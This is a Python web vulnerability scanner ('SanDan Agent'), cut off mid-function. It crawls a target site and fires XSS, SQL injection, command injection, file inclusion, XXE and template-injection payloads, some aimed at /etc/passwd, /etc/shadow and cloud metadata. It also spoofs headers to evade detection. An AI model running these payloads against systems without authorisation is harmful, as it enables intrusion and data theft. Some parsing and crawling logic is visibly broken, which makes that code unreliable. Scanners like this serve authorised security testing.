import requests
import hashlib
import datetime
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode
import sys
import time
import random
import json
import threading
import queue
import os
import re
import socket
import ssl
import dns.resolver
from fake_useragent import UserAgent
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed

class SanDanSecurityAgent:
    VERSION = "SanDan Agent v4.0 - KAGE Pro Mode"
    DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    def __init__(self, target_url=None, auth_token=None, expected_keywords=None, stealth_mode=True,
                     max_threads=5, proxy=None, custom_headers=None, debug=False):
        self.sandan_banner()

        # Configuration
        self.debug = debug
        self.max_threads = max_threads
        self.proxy = self._validate_proxy(proxy) if proxy else None
        self.custom_headers = custom_headers or {}
        self.stealth_mode = stealth_mode
        self.rate_limit_delay = 0.5  # seconds between requests
        self.timeout = 10 # Request timeout

        # Target information
        if not target_url:
            target_url = input("Enter target URL (e.g., http://example.com): ").strip()
        self.target_url = self._normalize_url(target_url)
        self.base_domain = self._get_base_domain(self.target_url)
        self.scheme = urlparse(self.target_url).scheme

        # Security settings
        self.auth_token = auth_token
        self.expected_keywords = expected_keywords or ["Welcome", "Login", "Home", "Dashboard"] # Expanded keywords
        self.session = self._create_session()
        self.log = []
        self.original_hash = None # For defacement check
        self.technologies = []
        self.cookies = {} # To store and analyze cookies
        self.vulnerabilities = {
            "critical": [],
            "high": [],
            "medium": [],
            "low": [],
            "info": []
        }

        # Fingerprinting data
        self.fingerprints = {
            "headers": {},
            "pages": {},
            "forms": [],
            "endpoints": [],
            "subdomains": [],
            "open_ports": []
        }

        # Load payloads
        self._load_payloads()

        # Initialize work queues (for future threaded scanning)
        self.scan_queue = queue.Queue()
        self.result_queue = queue.Queue()

    def _load_payloads(self):
        """Load various payloads for security testing from internal definitions or files."""
        self.payloads = {
            "xss": [
                "<script>alert('SanDanXSS')</script>",
                "<img src=x onerror=alert('SanDanXSS')>",
                "'\"><svg/onload=alert('SanDanXSS')>",
                "javascript:alert('SanDanXSS')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnU2FuRGFuWFNTJyk8L3NjcmlwdD4=",
                "<body onload=alert('SanDanXSS')>",
                "<iframe src=javascript:alert('SanDanXSS')></iframe>"
            ],
            "sqli": [
                "' OR '1'='1",
                "' OR 1=1 --",
                "' UNION SELECT NULL, username, password FROM users --",
                "'; WAITFOR DELAY '00:00:05' --",
                "\" OR \"\"=\"",
                "' OR SLEEP(5) AND '1'='1",
                "admin' --",
                "admin' #",
                "admin') --"
            ],
            "rce": {
                "unix": [";id", "|id", "`id`", "$(id)", "||id", ";cat /etc/passwd", "|cat /etc/passwd"],
                "windows": ["|whoami", ";whoami", "`whoami`", "||whoami", "&dir", "|type C:\\windows\\system32\\drivers\\etc\\hosts"]
            },
            "lfi": [
                "../../../../etc/passwd",
                "../../../../etc/shadow",
                "../../../../windows/win.ini",
                "file:///etc/passwd",
                "....//....//....//....//....//etc/passwd",
                "/proc/self/cmdline", # Linux specific
                "/proc/self/environ", # Linux specific
                "C:\\boot.ini" # Windows specific
            ],
            "xxe": [
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\" > ]>", # AWS metadata
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\"> ]>"
            ],
            "ssti": [
                "${7*7}", "<%= 7*7 %>", "{{7*7}}", "@(7*7)",
                "#{7*7}", "#{ {7*7} }" # Ruby/Jinja/Twig
            ],
            "idor": [
                "../user/1", "../admin", "/api/user/1",
                "/api/v1/users/2", "/accounts/edit?id=1",
                "/profile?id=123" # try with different IDs
            ],
            "open_redirect": [
                "//google.com", "///google.com",
                "\\google.com", "%09google.com",
                "http://google.com", "https://google.com"
            ],
            "subdomains": [
                "www", "admin", "dev", "test", "api", "blog", "mail", "app",
                "ftp", "cpanel", "webmail", "dashboard", "portal"
            ],
            "directories": [
                "admin/", "login/", "backup/", "test/", "dev/",
                "assets/", "images/", "uploads/", "config/",
                "docs/", "phpmyadmin/", "wp-admin/", ".git/",
                ".env", "robots.txt", "sitemap.xml", "phpinfo.php"
            ],
            "rate_limit_bypass": [
                "X-Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
                "X-Client-IP", "Host", "Referer", "User-Agent"
            ]
        }

    def _validate_proxy(self, proxy):
        """Validate and format proxy URL"""
        if not proxy.startswith(("http://", "https://", "socks5://")):
            proxy = "http://" + proxy
        try:
            self.log_finding(f"Attempting to validate proxy: {proxy}", "debug")
            requests.get("http://example.com", proxies={"http": proxy, "https": proxy}, timeout=self.timeout, verify=False)
            self.log_finding(f"Proxy '{proxy}' validated successfully.", "info")
            return proxy
        except requests.exceptions.RequestException as e:
            self.log_finding(f"[WARNING] Proxy validation failed for '{proxy}': {str(e)} - continuing without proxy", "warning")
            return None

    def _normalize_url(self, url):
        """Normalize the target URL to ensure proper scheme and trailing slash."""
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        return url.rstrip("/")

    def _get_base_domain(self, url):
        """Extract base domain from URL (e.g., example.com from www.example.com)."""
        parsed = urlparse(url)
        netloc = parsed.netloc
        # Handle cases like 'localhost' or IP addresses
        if '.' not in netloc:
            return netloc
        domain_parts = netloc.split(".")
        if len(domain_parts) > 2 and domain_parts[-2] in ["co", "com", "net", "org", "gov"] and domain_parts[-1] in ["uk", "au"]: # TLDs like .co.uk
            return ".".join(domain_parts[-3:])
        return ".".join(domain_parts[-2:])

    def _create_session(self):
        """Create and configure the requests session with dynamic headers and proxy."""
        session = requests.Session()

        # Rotating user agents for stealth
        ua = UserAgent()
        session.headers.update({
            "User-Agent": ua.random if self.stealth_mode else self.DEFAULT_USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })

        if self.stealth_mode:
            session.headers.update({
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Referer": "https://www.google.com/",
                "X-Requested-With": "XMLHttpRequest",
                "DNT": "1"
            })

        if self.auth_token:
            session.headers.update({"Authorization": f"Bearer {self.auth_token}"})

        if self.custom_headers:
            session.headers.update(self.custom_headers)

        if self.proxy:
            session.proxies = {
                "http": self.proxy,
                "https": self.proxy
            }

        return session

    def sandan_banner(self):
        """Display the SanDan Security banner."""
        print("\n" + "=" * 80)
        print(r"""
   ██████  ▄▄▄       ███▄ ▄███▓ ▓█████  ▄▄▄       ███▄ ▄███▓
 ▒██    ▒ ▒████▄     ▓██▒▀█▀ ██▒ ▓█  ▀ ▒████▄     ▓██▒▀█▀ ██▒
 ░ ▓██▄   ▒██ ▀█▄   ▓██    ▓██░ ▒███   ▒██ ▀█▄   ▓██    ▓██░
  ▒  ██▒░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░██▄▄▄▄██ ▒██    ▒██
 ▒██████▒▒ ▓█  ▓██▒▒██▒   ░██▒ ░▒████▒ ▓█  ▓██▒▒██▒   ░██▒
 ▒ ▒▓▒ ▒ ░ ▒▒  ▓▒█░░ ▒░   ░  ░ ░░ ▒░ ░ ▒▒  ▓▒█░░ ▒░   ░  ░
 ░ ░▒  ░ ░  ▒  ▒▒ ░░  ░        ░  ░ ░   ▒  ▒▒ ░░  ░        ░
 ░  ░  ░    ░  ▒  ░        ░        ░   ░  ▒  ░        ░
        ░       ░  ░          ░        ░      ░          ░

        """)
        print(f"{self.VERSION}")
        print("Advanced Web Application Security Scanner - For Authorized Testing Only")
        print("=" * 80 + "\n")

    def log_finding(self, msg, level="info"):
        """Log findings with severity levels and color coding for terminal output."""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        full_msg = f"[SanDan][{timestamp}][{level.upper()}] {msg}"
        self.log.append((full_msg, level))

        # Color coding for terminal output
        color_code = {
            "critical": "\033[91m",  # Red
            "high": "\033[93m",      # Yellow
            "medium": "\033[96m",    # Cyan
            "low": "\033[92m",       # Green
            "warning": "\033[93m",   # Yellow for warnings
            "debug": "\033[90m"      # Grey for debug
        }.get(level, "\033[0m") # Default to no color

        reset_code = "\033[0m"

        if level == "debug" and not self.debug:
            return # Don't print debug messages unless debug is enabled

        print(f"{color_code}{full_msg}{reset_code}")

        # Store in vulnerabilities dictionary
        if level in self.vulnerabilities:
            self.vulnerabilities[level].append(msg)

    def _send_request(self, method, url, data=None, params=None, headers=None, allow_redirects=False, json_data=None):
        """
        Send HTTP request with enhanced error handling, rate limiting, and options for JSON data.
        """
        time.sleep(self.rate_limit_delay)  # Respect rate limits

        request_headers = self.session.headers.copy()
        if headers:
            request_headers.update(headers)

        try:
            if method.upper() == "GET":
                response = self.session.get(
                    url,
                    params=params,
                    headers=request_headers,
                    allow_redirects=allow_redirects,
                    timeout=self.timeout,
                    verify=False # Set to True for production scanning with valid certs
                )
            elif method.upper() == "POST":
                response = self.session.post(
                    url,
                    data=data,
                    json=json_data, # Use json parameter for JSON payloads
                    headers=request_headers,
                    allow_redirects=allow_redirects,
                    timeout=self.timeout,
                    verify=False
                )
            elif method.upper() == "HEAD":
                response = self.session.head(
                    url,
                    headers=request_headers,
                    allow_redirects=allow_redirects,
                    timeout=self.timeout,
                    verify=False
                )
            elif method.upper() == "OPTIONS":
                response = self.session.options(
                    url,
                    headers=request_headers,
                    allow_redirects=allow_redirects,
                    timeout=self.timeout,
                    verify=False
                )
            else: # For PUT, DELETE, TRACE, CONNECT, PATCH
                response = self.session.request(
                    method,
                    url,
                    data=data,
                    json=json_data,
                    params=params,
                    headers=request_headers,
                    allow_redirects=allow_redirects,
                    timeout=self.timeout,
                    verify=False
                )

            return response

        except requests.exceptions.Timeout:
            self.log_finding(f"Request to {url} timed out ({self.timeout}s).", "warning")
            return None
        except requests.exceptions.ConnectionError as e:
            self.log_finding(f"Connection error to {url}: {str(e)}", "warning")
            return None
        except requests.exceptions.TooManyRedirects:
            self.log_finding(f"Too many redirects for {url}.", "warning")
            return None
        except requests.exceptions.RequestException as e:
            self.log_finding(f"An unexpected request error occurred for {url}: {str(e)}", "warning")
            return None

    def fingerprint_web_technologies(self):
        """Identify web technologies in use, checking headers, common files, and page content."""
        self.log_finding("Starting technology fingerprinting...", "info")

        # Check common files for technology signatures
        common_files = [
            "/robots.txt", "/sitemap.xml", "/package.json", "/composer.json",
            "/.env", "/.git/config", "/crossdomain.xml", "/clientaccesspolicy.xml",
            "/server-info", "/server-status" # Apache specific
        ]

        # Technology patterns in headers and body
        tech_patterns = {
            "PHP": {"header": "x-powered-by", "value": "PHP"},
            "Apache": {"header": "server", "value": "Apache"},
            "Nginx": {"header": "server", "value": "nginx"},
            "IIS": {"header": "server", "value": "IIS"},
            "Express": {"header": "x-powered-by", "value": "Express"},
            "Node.js": {"header": "x-powered-by", "value": "Express|Node.js", "body_regex": "nodejs"},
            "React": {"body_regex": "data-reactroot|react-dom"},
            "Angular": {"body_regex": "ng-app|angular.element"},
            "Vue.js": {"body_regex": "vue.js"},
            "WordPress": {"body_regex": "wp-content|wp-includes|wordpress"},
            "Joomla": {"body_regex": "joomla.debug"},
            "Drupal": {"header": "x-generator", "value": "Drupal"},
            "ASP.NET": {"header": "x-aspnet-version", "value": ".*"},
            "OpenSSL": {"header": "server", "value": "OpenSSL"}
        }

        response = self._send_request("GET", self.target_url)
        if response:
            headers = response.headers
            body_content = response.text.lower() # For body regex matching

            for tech_name, patterns in tech_patterns.items():
                if "header" in patterns and patterns["header"] in headers and re.search(patterns["value"], headers[patterns["header"]], re.IGNORECASE):
                    if tech_name not in self.technologies:
                        self.technologies.append(tech_name)
                        self.log_finding(f"Detected technology (Header): {tech_name} ({headers[patterns['header']]})", "info")
                if "body_regex" in patterns and re.search(patterns["body_regex"], body_content):
                    if tech_name not in self.technologies:
                        self.technologies.append(tech_name)
                        self.log_finding(f"Detected technology (Body): {tech_name}", "info")

            # Server technologies
            if "server" in headers:
                if f"Server: {headers['server']}" not in self.technologies:
                    self.technologies.append(f"Server: {headers['server']}")
                    self.log_finding(f"Detected server: {headers['server']}", "info")

            # Web frameworks
            if "x-powered-by" in headers:
                if f"Powered by: {headers['x-powered-by']}" not in self.technologies:
                    self.technologies.append(f"Powered by: {headers['x-powered-by']}")
                    self.log_finding(f"Detected framework: {headers['x-powered-by']}", "info")

            # Security headers check
            self.check_security_headers(initial_response=response) # Pass initial response to avoid duplicate request

            # Cookies analysis (from initial response)
            self._analyze_cookies(response.cookies)

        # Check common files
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self._check_common_file, file) for file in common_files]
            for future in as_completed(futures):
                pass # Results are logged within _check_common_file

        # Check for common admin panels (as part of general info gathering)
        admin_paths = [
            "/admin", "/wp-admin", "/administrator", "/manager", "/cpanel",
            "/backend", "/console", "/admin.php", "/admin.asp", "/user/login",
            "/phpmyadmin", "/wp-login.php"
        ]
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self._check_admin_path, path) for path in admin_paths]
            for future in as_completed(futures):
                pass # Results are logged within _check_admin_path

        self.log_finding("Technology fingerprinting completed.", "info")

    def _check_common_file(self, file_path):
        """Helper for checking common files."""
        url = urljoin(self.target_url, file_path)
        response = self._send_request("GET", url)
        if response and response.status_code == 200:
            self.log_finding(f"Found accessible file: {file_path} (Status: {response.status_code})", "info")
            # Analyze robots.txt
            if file_path == "/robots.txt":
                disallowed = [line.split(": ")[1].strip() for line in response.text.splitlines()
                                 if line.lower().startswith("disallow:")]
                if disallowed:
                    self.log_finding(f"Disallowed paths in robots.txt: {', '.join(disallowed)}", "low")
            # Analyze .git/config
            if file_path == "/.git/config" and "[core]" in response.text:
                self.log_finding("Found exposed Git configuration - potential source code disclosure!", "high")
            if file_path == "/.env" and any(re.search(r"DB_HOST|APP_KEY|APP_DEBUG", response.text)):
                 self.log_finding("Found exposed .env file - potential sensitive information disclosure!", "high")
        elif response and response.status_code in [401, 403]:
            self.log_finding(f"Forbidden/Unauthorized access to: {file_path}", "info")

    def _check_admin_path(self, path):
        """Helper for checking admin paths."""
        url = urljoin(self.target_url, path)
        response = self._send_request("GET", url)
        if response and response.status_code == 200 and len(response.text) > 100: # Basic check for non-empty page
            self.log_finding(f"Possible admin/management panel found: {url} (Status: {response.status_code})", "high")

    def _analyze_cookies(self, cookies_jar):
        """Analyzes cookies for security flags."""
        for cookie in cookies_jar:
            cookie_str = f"{cookie.name}={cookie.value}"
            if not cookie.secure and self.scheme == "https":
                self.log_finding(f"Cookie '{cookie.name}' without 'Secure' flag on HTTPS site.", "medium")
            if not cookie.has_httponly:
                self.log_finding(f"Cookie '{cookie.name}' without 'HttpOnly' flag.", "medium")
            if not cookie.samesite:
                self.log_finding(f"Cookie '{cookie.name}' without 'SameSite' attribute.", "low")
            elif cookie.samesite.lower() == "none" and cookie.secure:
                self.log_finding(f"Cookie '{cookie.name}' uses SameSite=None with Secure - OK.", "info")
            elif cookie.samesite.lower() == "none" and not cookie.secure:
                 self.log_finding(f"Cookie '{cookie.name}' uses SameSite=None without Secure - potential CSRF risk.", "medium")


    def crawl_website(self, max_pages=50):
        """Crawl the website to discover pages, forms, and endpoints."""
        self.log_finding(f"Crawling website (max {max_pages} pages)...", "info")

        visited = set()
        to_visit = {self.target_url}
        forms_found = []
        endpoints_found = set() # To store unique endpoints

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(self._process_url_for_crawling, url, visited, to_visit, forms_found, endpoints_found) for url in to_visit.copy()}

            while to_visit and len(visited) < max_pages:
                current_url = to_visit.pop()
                if current_url in visited:
                    continue

                visited.add(current_url)
                self.log_finding(f"Crawling: {current_url}", "debug")

                future = executor.submit(self._process_url_for_crawling, current_url, visited, to_visit, forms_found, endpoints_found)
                futures.add(future) # Add to futures set

                # Wait for some futures to complete to keep to_visit populated
                done, pending = as_completed(futures), futures # <--- MODIFIED: Removed timeout
                futures = set(pending) # Keep pending futures

                for f in done:
                    new_links, new_forms, new_endpoints = f.result() # Get results from processed URL
                    for link in new_links:
                        if len(visited) < max_pages: # Check limit before adding more
                            to_visit.add(link)
                    forms_found.extend(new_forms)
                    endpoints_found.update(new_endpoints)


        self.fingerprints["forms"] = forms_found
        self.fingerprints["endpoints"] = list(endpoints_found) # Convert set to list
        self.log_finding(f"Crawling completed. Found {len(visited)} pages, {len(forms_found)} forms, and {len(endpoints_found)} unique endpoints.", "info")

    def _process_url_for_crawling(self, url, visited, to_visit_queue, forms_found, endpoints_found):
        """Helper function for concurrent crawling."""
        new_links = set()
        new_forms = []
        new_endpoints = set()

        try:
            response = self._send_request("GET", url)
            if not response or response.status_code != 200:
                return new_links, new_forms, new_endpoints

            # Store page fingerprint
            page_hash = hashlib.sha256(response.text.encode(errors='ignore')).hexdigest()
            self.fingerprints["pages"][url] = {
                "hash": page_hash,
                "status": response.status_code,
                "size": len(response.text)
            }

            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find all links
            for link in soup.find_all('a', href=True):
                href = link['href']
                absolute_url = urljoin(url, href)

                # Filter out external links and non-http links, avoid fragment identifiers
                parsed_absolute = urlparse(absolute_url)
                clean_url = parsed_absolute.scheme + "://" + parsed_absolute.netloc + parsed_absolute.path
                if clean_url.startswith(self.target_url) and clean_url not in visited:
                    new_links.add(clean_url)
                    new_endpoints.add(clean_url) # Add to endpoints as well

            # Find all forms
            for form in soup.find_all('form'):
                form_data = {
                    "action": urljoin(url, form.get('action', '')),
                    "method": form.get('method', 'GET').upper(),
                    "inputs": []
                }
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    form_data["inputs"].append({
                        "name": input_tag.get('name', ''),
                        "type": input_tag.get('type', input_tag.name), # input_tag.name will be 'textarea' or 'select'
                        "value": input_tag.get('value', ''),
                        "id": input_tag.get('id', '')
                    })
                new_forms.append(form_data)
                new_endpoints.add(form_data["action"]) # Add form action as an endpoint

            # Discover endpoints from JavaScript (basic regex)
            js_endpoints = re.findall(r'["\'](/[\w\-\./=?&#%]+?)["\']', response.text)
            for ep in js_endpoints:
                full_ep_url = urljoin(self.target_url, ep)
                if full_ep_url.startswith(self.target_url):
                    new_endpoints.add(full_ep_url)

        except Exception as e:
            self.log_finding(f"Error processing URL {url} during crawling: {str(e)}", "debug")

        return new_links, new_forms, new_endpoints


    def scan_xss(self):
        """Advanced XSS scanning with context awareness (reflected/stored in params/forms)."""
        self.log_finding("Starting advanced XSS scanning...", "info")
        xss_found_count = 0

        # Test URL parameters
        self.log_finding("Testing XSS in URL parameters...", "info")
        for payload in self.payloads["xss"]:
            encoded_payload = urlencode({"param": payload})[6:] # Extract only payload part
            test_url = f"{self.target_url}?{encoded_payload}"
            response = self._send_request("GET", test_url)
            if response and payload in response.text:
                self.log_finding(f"Reflected XSS detected in URL parameter: {test_url} with payload: {payload}", "high")
                xss_found_count += 1

        # Test stored XSS in forms
        self.log_finding("Testing XSS in forms...", "info")
        for form in self.fingerprints["forms"]:
            action = form["action"]
            method = form["method"]
            form_payload_count = 0
            for input_field in form["inputs"]:
                if input_field["type"] in ["text", "textarea", "search", "url", "email"]:
                    for payload in self.payloads["xss"]:
                        data_to_send = {i["name"]: payload if i["name"] == input_field["name"] else i["value"]
                                        for i in form["inputs"]}

                        response = self._send_request(method, action, data=data_to_send)
                        if response and payload in response.text:
                            self.log_finding(f"Possible Stored XSS in form '{action}' (field: {input_field['name']}) with payload: {payload}", "critical")
                            xss_found_count += 1
                            form_payload_count += 1
                            break # Move to next form after one finding

            if form_payload_count > 0:
                self.log_finding(f"Found {form_payload_count} XSS vulnerabilities in form at {action}.", "info")

        if xss_found_count == 0:
            self.log_finding("No XSS vulnerabilities detected.", "info")
        else:
            self.log_finding(f"XSS scan completed. Found {xss_found_count} XSS vulnerabilities.", "high")

    def test_sqli(self):
        """Advanced SQL injection testing with error-based, boolean-based, and time-based techniques."""
        self.log_finding("Starting advanced SQL injection testing...", "info")
        sqli_found_count = 0
        error_patterns = [
            "SQL syntax", "mysql_fetch", "syntax error", "unclosed quotation mark",
            "ORA-", "SQL command not properly ended", "PostgreSQL error",
            "Microsoft SQL Server", "DB2 SQL Error"
        ]

        # Test in URL parameters
        self.log_finding("Testing SQLi in URL parameters...", "info")
        for endpoint in self.fingerprints["endpoints"]:
            parsed_url = urlparse(endpoint)
            query_params = parsed_url.query
            if not query_params: continue # Only test URLs with parameters

            for param_name, _ in urlparse(endpoint).query.items(): # This won't work correctly. Need to parse query string.
                 # Reconstruct the URL with a dummy parameter to inject
                query_dict = dict(q.split("=") for q in query_params.split("&") if "=" in q)
                for param_to_test in query_dict:
                    for payload in self.payloads["sqli"]:
                        temp_query_dict = query_dict.copy()
                        temp_query_dict[param_to_test] = payload
                        test_url = parsed_url._replace(query=urlencode(temp_query_dict)).geturl()
                        response = self._send_request("GET", test_url)

                        if not response: continue

                        # Error-based detection
                        if any(pattern.lower() in response.text.lower() for pattern in error_patterns):
                            self.log_finding(f"Error-based SQLi detected in URL: {test_url} with payload: {payload}", "critical")
                            sqli_found_count += 1
                            continue # Move to next payload/param

                        # Time-based detection
                        if "WAITFOR DELAY" in payload or "SLEEP" in payload:
                            start_time = time.time()
                            self._send_request("GET", test_url)
                            elapsed = time.time() - start_time
                            if elapsed > self.timeout: # Check if delay was significant
                                self.log_finding(f"Possible time-based SQLi (delay {elapsed:.2f}s) in URL: {test_url} with payload: {payload}", "high")
                                sqli_found_count += 1
                                continue

        # Test in POST data
        self.log_finding("Testing SQLi in forms (POST data)...", "info")
        for form in self.fingerprints["forms"]:
            action = form["action"]
            method = form["method"]
            if method != "POST": continue

            for input_field in form["inputs"]:
                if input_field["type"] in ["text", "password", "textarea"]:
                    for payload in self.payloads["sqli"]:
                        data_to_send = {i["name"]: payload if i["name"] == input_field["name"] else i["value"]
                                        for i in form["inputs"]}
                        response = self._send_request(method, action, data=data_to_send)

                        if not response: continue

                        # Error-based detection
                        if any(pattern.lower() in response.text.lower() for pattern in error_patterns):
                            self.log_finding(f"Error-based SQLi detected in form '{action}' (field: {input_field['name']}) with payload: {payload}", "critical")
                            sqli_found_count += 1
                            break # Move to next form field/form

                        # Time-based detection
                        if "WAITFOR DELAY" in payload or "SLEEP" in payload:
                            start_time = time.time()
                            self._send_request(method, action, data=data_to_send)
                            elapsed = time.time() - start_time
                            if elapsed > self.timeout:
                                self.log_finding(f"Possible time-based SQLi (delay {elapsed:.2f}s) in form '{action}' (field: {input_field['name']}) with payload: {payload}", "high")
                                sqli_found_count += 1
                                break # Move to next form field/form

                        # Basic authentication bypass check (if login form)
                        if "login" in action.lower() or "auth" in action.lower():
                            if any(kw.lower() in response.text.lower() for kw in self.expected_keywords):
                                if "logout" in response.text.lower(): # If we successfully logged in
                                    self.log_finding(f"Possible SQLi authentication bypass at {action} with payload: {payload}", "critical")
                                    sqli_found_count += 1
                                    break

        if sqli_found_count == 0:
            self.log_finding("No SQL injection vulnerabilities detected.", "info")
        else:
            self.log_finding(f"SQLi scan completed. Found {sqli_found_count} SQL injection vulnerabilities.", "high")


    def test_rce(self):
        """Test for Remote Code Execution vulnerabilities."""
        self.log_finding("Starting RCE testing...", "info")
        rce_found_count = 0
        rce_keywords = {
            "unix": ["uid=", "gid=", "root:", "nobody", "daemon", "bin", "/etc/passwd"],
            "windows": ["Windows NT", "Microsoft Windows", "Volume in drive", "Directory of", "System32", "Administrator"]
        }

        # Test in URL parameters
        self.log_finding("Testing RCE in URL parameters...", "info")
        for endpoint in self.fingerprints["endpoints"]:
            parsed_url = urlparse(endpoint)
            query_params = parsed_url.query
            if not query_params: continue

            query_dict = dict(q.split("=") for q in query_params.split("&") if "=" in q)
            for param_to_test in query_dict:
                for os_type, cmd_list in self.payloads["rce"].items():
                    for cmd in cmd_list:
                        temp_query_dict = query_dict.copy()
                        temp_query_dict[param_to_test] = cmd
                        test_url = parsed_url._replace(query=urlencode(temp_query_dict)).geturl()
                        response = self._send_request("GET", test_url)

                        if not response: continue

                        if any(keyword.lower() in response.text.lower() for keyword in rce_keywords[os_type]):
                            self.log_finding(f"Possible {os_type.capitalize()} RCE detected in URL: {test_url} with payload: {cmd}", "critical")
                            rce_found_count += 1
                            # Assuming one RCE payload is enough per param for a finding
                            break
                    if rce_found_count > 0: break # Move to next endpoint if RCE found

        # Test in POST data
        self.log_finding("Testing RCE in forms (POST data)...", "info")
        for form in self.fingerprints["forms"]:
            action = form["action"]
            method = form["method"]
            if method != "POST": continue

            for input_field in form["inputs"]:
                if input_field["type"] in ["text", "textarea"]:
                    for os_type, cmd_list in self.payloads["rce"].items():
                        for cmd in cmd_list:
                            data_to_send = {i["name"]: cmd if i["name"] == input_field["name"] else i["value"]
                                            for i in form["inputs"]}
                            response = self._send_request(method, action, data=data_to_send)

                            if not response: continue

                            if any(keyword.lower() in response.text.lower() for keyword in rce_keywords[os_type]):
                                self.log_finding(f"Possible {os_type.capitalize()} RCE detected in form '{action}' (field: {input_field['name']}) with payload: {cmd}", "critical")
                                rce_found_count += 1
                                break
                        if rce_found_count > 0: break # Move to next form field/form

        if rce_found_count == 0:
            self.log_finding("No RCE vulnerabilities detected.", "info")
        else:
            self.log_finding(f"RCE scan completed. Found {rce_found_count} RCE vulnerabilities.", "high")

    def test_file_inclusion(self):
        """Test for Local and Remote File Inclusion vulnerabilities."""
        self.log_finding("Starting file inclusion testing...", "info")
        lfi_found_count = 0
        lfi_signatures = ["root:x:", "[extensions]", "win.ini", "boot.ini", "C:\\", "/bin/bash", "daemon:x:"]

        # Test LFI in URL parameters
        self.log_finding("Testing LFI in URL parameters...", "info")
        for endpoint in self.fingerprints["endpoints"]:
            parsed_url = urlparse(endpoint)
            query_params = parsed_url.query
            if not query_params: continue

            query_dict = dict(q.split("=") for q in query_params.split("&") if "=" in q)
            for param_to_test in query_dict:
                for payload in self.payloads["lfi"]:
                    temp_query_dict = query_dict.copy()
                    temp_query_dict[param_to_test] = payload
                    test_url = parsed_url._replace(query=urlencode(temp_query_dict)).geturl()
                    response = self._send_request("GET", test_url)

                    if not response: continue

                    if response.status_code == 200 and any(sig.lower() in response.text.lower() for sig in lfi_signatures):
                        self.log_finding(f"Possible LFI detected in URL: {test_url} with payload: {payload}", "high")
                        lfi_found_count += 1
                        break # Move to next param/endpoint

        # Test LFI in POST data
        self.log_finding("Testing LFI in forms (POST data)...", "info")
        for form in self.fingerprints["forms"]:
            action = form["action"]
            method = form["method"]
            if method != "POST": continue

            for input_field in form["inputs"]:
                if input_field["type"] in ["text", "file", "textarea"]:
                    for payload in self.payloads["lfi"]:
                        data_to_send = {i["name"]: payload if i["name"] == input_field["name"] else i["value"]
                                        for i in form["inputs"]}
                        response = self._send_request(method, action, data=data_to_send)

                        if not response: continue

                        if response.status_code == 200 and any(sig.lower() in response.text.lower() for sig in lfi_signatures):
                            self.log_finding(f"Possible LFI detected in form '{action}' (field: {input_field['name']}) with payload: {payload}", "high")
                            lfi_found_count += 1
                            break # Move to next form field/form

        if lfi_found_count == 0:
            self.log_finding("No file inclusion vulnerabilities detected.", "info")
        else:
            self.log_finding(f"File inclusion scan completed. Found {lfi_found_count} vulnerabilities.", "high")


    def test_xxe(self):
        """Test for XML External Entity (XXE) vulnerabilities."""
        self.log_finding("Starting XXE testing...", "info")
        xxe_found_count = 0
        xxe_signatures = ["root:x:", "file:///etc/passwd", "file:///C:/", "AWS", "meta-data"]

        # Only test endpoints that might accept XML (e.g., SOAP endpoints or certain API endpoints)
        # For simplicity, we'll test the base URL and any discovered endpoints that might look like APIs.
        potential_xxe_endpoints = [self.target_url] + [ep for ep in self.fingerprints["endpoints"] if "/api/" in ep.lower() or ".xml" in ep.lower()]
        potential_xxe_endpoints = list(set(potential_xxe_endpoints)) # Remove duplicates

        for url in potential_xxe_endpoints:
            for payload in self.payloads["xxe"]:
                headers = {"Content-Type": "application/xml"}
                response = self._send_request("POST", url, data=payload, headers=headers)

                if not response: continue

                if response.status_code == 200 and any(sig.lower() in response.text.lower() for sig in xxe_signatures):
                    self.log_finding(f"Possible XXE vulnerability detected at {url} with payload: {payload[:50]}...", "critical")
                    xxe_found_count += 1
                    break # Move to next endpoint after finding one XXE

        if xxe_found_count == 0:
            self.log_finding("No XXE vulnerabilities detected.", "info")
        else:
            self.log_finding(f"XXE scan completed. Found {xxe_found_count} XXE vulnerabilities.", "high")

    def test_ssti(self):
        """Test for Server-Side Template Injection (SSTI) vulnerabilities."""
        self.log_finding("Starting SSTI testing...", "info")
        ssti_found_count = 0
        ssti_result_pattern = "49" # Expected result of 7*7

        # Test in URL parameters
        self.log_finding("Testing SSTI in URL parameters...", "info")
        for endpoint in self.fingerprints["endpoints"]:
            parsed_url = urlparse(endpoint)
            query_params = parsed_url.query
            if not query_params: continue

            query_dict = dict(q.split("=") for q in query_params.split("&") if "=" in q)
            for param_to_test in query_dict:
                for payload in self.payloads["ssti"]:
                    temp_query_dict = query_dict.copy()
                    temp_query_dict[param_to_test] = payload
                    test_url = parsed_url._replace(query=urlencode(temp_query_dict)).geturl()
                    response = self._send_request("GET", test_url)

                    if not response: continue

                    if ssti_result_pattern in response.text:
                        self.log_finding(f"Possible SSTI detected in URL: {test_url} with payload: {payload}", "high")
                        ssti_found_count += 1
                        break # Move to next param/endpoint

        # Test in POST data
